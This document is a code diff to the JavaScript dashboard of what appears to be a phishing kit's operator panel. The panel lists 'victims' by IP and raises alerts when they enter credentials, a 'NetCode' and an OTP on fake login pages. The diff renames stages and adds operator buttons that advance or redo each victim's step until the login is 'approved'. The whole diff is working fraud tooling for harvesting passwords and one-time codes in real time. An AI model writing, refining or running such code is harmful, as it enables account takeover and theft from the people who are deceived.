@@ -683,72 +683,101 @@
     }
 
     /* ----------  STATUS  ---------- */
-    function statusText(s){
-      if (s.page==='success' || s.status==='approved') return '';
-      if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
-      if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
-      if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
-      if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
-      return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
-    }
+function statusText(s){
+  if (s.page==='success' || s.status==='approved') return '<div style="font-size:11px;color:var(--green)">APPROVED ✓</div>';
+  if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">CREDENTIALS ENTERED</div>';
+  if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">NETCODE ENTERED</div>';
+  if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">UNREGISTER CLICKED</div>';
+  if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">OTP ENTERED</div>';
+  return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
+}
 
     /* ----------  ACTIONS  ---------- */
-    function actionButtons(s){
-      let html = '<div style="display:flex;gap:6px">';
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
-      if (s.page === 'success' || s.status === 'approved') return html + '</div>';
-      if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'verify.html' && s.phone) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'unregister.html' && s.unregisterClicked) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'otp.html' && s.otp) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      return html + '</div>';
+function actionButtons(s){
+  let html = '<div style="display:flex;gap:6px">';
+  html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
+  
+  // Don't show action buttons for approved/completed sessions
+  if (s.page === 'success' || s.status === 'approved') return html + '</div>';
+  
+  // index.html: credentials entered, waiting for approval
+  if (s.page === 'index.html' && s.entered) {
+    html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to Verify"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+    html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo Credentials"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+  } 
+  // verify.html: NetCode entered, waiting for approval
+  else if (s.page === 'verify.html' && s.phone) {
+    html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to Unregister"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+    html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo NetCode"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+  } 
+  // unregister.html: waiting for click or clicked
+  else if (s.page === 'unregister.html') {
+    if (s.unregisterClicked) {
+      html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to OTP"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
     }
+    // No redo for unregister page
+  } 
+  // otp.html: OTP entered, waiting for approval
+  else if (s.page === 'otp.html' && s.otp) {
+    html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Approve Login"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+    html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo OTP"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+  }
+  
+  return html + '</div>';
+}
 
     /* ----------  CHANGES  ---------- */
-    function checkChanges(newSessions){
-      if (isFirstLoad) {
-        lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
-        isFirstLoad = false;
-        return;
-      }
+function checkChanges(newSessions){
+  if (isFirstLoad) {
+    lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+    isFirstLoad = false;
+    return;
+  }
+  
+  newSessions.forEach(s => {
+    const old = lastSessions.get(s.sid);
+    if (!old) {
+      // New visitor connected
+      showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
+      // Check if they already entered credentials (rare but possible)
+      if (s.entered) showAlert('success', 'CREDENTIALS ENTERED', `Client: ${s.email}`, s.victimNum);
+      if (s.phone) showAlert('info', 'NETCODE ENTERED', `Code: ${s.phone}`, s.victimNum);
+    } else {
+      // Existing visitor - check for changes
+      if (!old.entered && s.entered) 
+        showAlert('success', 'CREDENTIALS ENTERED', `Client: ${s.email}`, s.victimNum);
       
-      newSessions.forEach(s => {
-        const old = lastSessions.get(s.sid);
-        if (!old) {
-          showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
-          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
-        } else {
-          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
-          if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
-          if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
-          if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
-          if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
-            showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
-          }
-        }
-      });
-      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+      // Check for NetCode entry (stored in phone field from verify.html)
+      if (!old.phone && s.phone) 
+        showAlert('info', 'NETCODE ENTERED', `Code: ${s.phone}`, s.victimNum);
+      
+      if (!old.unregisterClicked && s.unregisterClicked) 
+        showAlert('warning', 'UNREGISTER CLICKED', 'Victim proceeded to unregister', s.victimNum);
+      
+      if (!old.otp && s.otp) 
+        showAlert('success', 'OTP ENTERED', `Code: ${s.otp}`, s.victimNum);
+      
+      if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
+        showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
+      }
     }
+  });
+  
+  // Update lastSessions for next comparison
+  lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+}
 
     /* ----------  RENDER  ---------- */
     function pageTitle(f){
-      if (f === 'success') return 'APPROVED';
-      switch(f){
-        case 'index.html': return 'LOGIN';
-        case 'verify.html': return 'PHONE';
-        case 'unregister.html': return 'UNREGISTER';
-        case 'otp.html': return 'OTP';
-        default: return f;
-      }
-    }
+  if (f === 'success') return 'APPROVED ✓';
+  switch(f){
+    case 'index.html': return 'LOGIN';
+    case 'verify.html': return 'NETCODE';
+    case 'unregister.html': return 'UNREGISTER';
+    case 'otp.html': return 'OTP';
+    default: return f;
+  }
+}
     
     function isApproved(s) {
       return s.page === 'success' || s.status === 'approved';
@@ -950,3 +979,4 @@
   </script>
 </body>
 </html>
+
